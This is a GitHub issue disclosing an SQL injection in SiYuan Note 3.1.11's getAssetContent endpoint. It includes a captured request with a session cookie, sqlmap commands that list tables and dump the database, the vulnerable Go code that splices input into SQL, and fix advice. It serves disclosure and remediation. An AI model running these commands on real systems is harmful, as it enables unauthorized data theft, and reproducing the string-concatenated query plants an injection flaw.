### **[TaiPhung217](/TaiPhung217)** commented [Nov 6, 2024](#issue-2637595714)

| Is there an existing issue for this?  * I have searched the existing issues  Can the issue be reproduced with the default theme (daylight/midnight)?  * I was able to reproduce the issue with the default theme  Could the issue be due to extensions?  * I've ruled out the possibility that the extension is causing the problem.  Describe the problem An SQL injection vulnerability has been identified in `version 3.1.11` of the Siyuan Note application in the id parameter at the `/api/search/getAssetContent` endpoint. An attacker sending a sql injection exploit payload instead of id could leak the database. POC Steps to Reproduce:   1. Set up the Siyuan Note application version 3.1.11 in a local environment. 2. Use sqlmap tools to dump database at api `/api/search/getAssetContent`    download sqlmap: `sudo apt install sqlmap`  ``` POST /api/search/getAssetContent HTTP/1.1 Host: localhost:6806 Content-Length: 64 sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126" sec-ch-ua-platform: "Windows" Accept-Language: en-US sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Origin: http://localhost:6806 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://localhost:6806/stage/build/desktop/?r=vshr05s Accept-Encoding: gzip, deflate, br Cookie: siyuan=MTczMDg2MTkxNnxEWDhFQVFMX2dBQUJFQUVRQUFCeF80QUFBUVp6ZEhKcGJtY01CZ0FFWkdGMFlRWnpkSEpwYm1jTVZRQlRleUpYYjNKcmMzQmhZMlZ6SWpwN0lpOXphWGwxWVc0dmQyOXlhM053WVdObEx5STZleUpCWTJObGMzTkJkWFJvUTI5a1pTSTZJakV5TXpRaUxDSkRZWEIwWTJoaElqb2lZbWcxY21KMmVTSjlmWDA9fF5xFoKuR_nqED8t-xyAdLUhXwMIaj9E3nswwd1J_2-M; _ga=GA1.1.1190341866.1730861926; _ga_L7WEXVQCR9=GS1.1.1730861926.1.1.1730865252.0.0.0 Connection: keep-alive  {"id":"*", "query":"abc","queryMethod":"abc"}  ```  3. Save the above requests to file `1.txt`, put a `*` at the position where you want to insert the payload 4. Run command:  * list all tables in database:  ``` sqlmap -r 1.txt --batch --threads 10 --level 5 --risk 3 --tables  ```  [image](https://private-user-images.githubusercontent.com/102504154/383503030-d785b8e3-16de-4c97-8c7c-a166b0cf8ff9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY5MjkyNzAsIm5iZiI6MTczNjkyODk3MCwicGF0aCI6Ii8xMDI1MDQxNTQvMzgzNTAzMDMwLWQ3ODViOGUzLTE2ZGUtNGM5Ny04YzdjLWExNjZiMGNmOGZmOS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE1JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNVQwODE2MTBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03OTcyMDYwM2Y4MmIzNWY1MjEzN2Y4NmU3YzBjMjA3ZGI2NzY3YzczYTUzNzk3MTExYzQyNGRlNmUyYjg2ZjkxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.jrgRwA8NtuCoHkB0FVCQ83xjlIu10-kysVNjUgH1VjA)   * extract all data in database  ``` sqlmap -r 1.txt --batch --threads 10 --level 5 --risk 3 --dump  ```  result:  ``` kali@kali:~/tools$ ls /home/kali/.local/share/sqlmap/output/localhost/dump/SQLite_masterdb/ block-10743247.bin  histories_fts_case_insensitive_config.csv    histories_fts_case_insensitive.csv.1        histories_fts_case_insensitive_idx.csv block-68934642.bin  histories_fts_case_insensitive_config.csv.1  histories_fts_case_insensitive_data.csv     histories_fts_case_insensitive_idx.csv.1 block-79335175.bin  histories_fts_case_insensitive_content.csv   histories_fts_case_insensitive_data.csv.1 block-91847017.bin  histories_fts_case_insensitive.csv           histories_fts_case_insensitive_docsize.csv  ``` The code that caused the vulnerability: because there is direct string concatenation from controllable input data into sql query statement without special character filtering. file: `/siyuan-3.1.11/kernel/model/asset_content.go`  ``` func GetAssetContent(id, query string, queryMethod int) (ret *AssetContent) { 	if "" != query && (0 == queryMethod || 1 == queryMethod) { 		if 0 == queryMethod { 			query = stringQuery(query) 		} 	}  	table := "asset_contents_fts_case_insensitive" 	filter := " id = '" + id + "'" 	if "" != query { 		filter += " AND `" + table + "` MATCH '" + buildAssetContentColumnFilter() + ":(" + query + ")'" 	}  	projections := "id, name, ext, path, size, updated, " + 		"highlight(" + table + ", 6, '" + search.SearchMarkLeft + "', '" + search.SearchMarkRight + "') AS content" 	stmt := "SELECT " + projections + " FROM " + table + " WHERE " + filter 	assetContents := sql.SelectAssetContentsRawStmt(stmt, 1, 1) 	results := fromSQLAssetContents(&assetContents, 36) 	if 1 > len(results) { 		return 	} 	ret = results[0] 	ret.Content = strings.ReplaceAll(ret.Content, "\n", "<br>") 	return }   ``` Impact  * SQL injection  Expected result  1. Use parameterized queries or prepared statements to prevent SQL injection attacks: <https://go.dev/doc/database/prepared-statements> 2. Sanitize and validate all user inputs to avoid malicious queries being executed. 3. Implement appropriate security measures such as input validation and error handling to mitigate the risk of SQL injection.
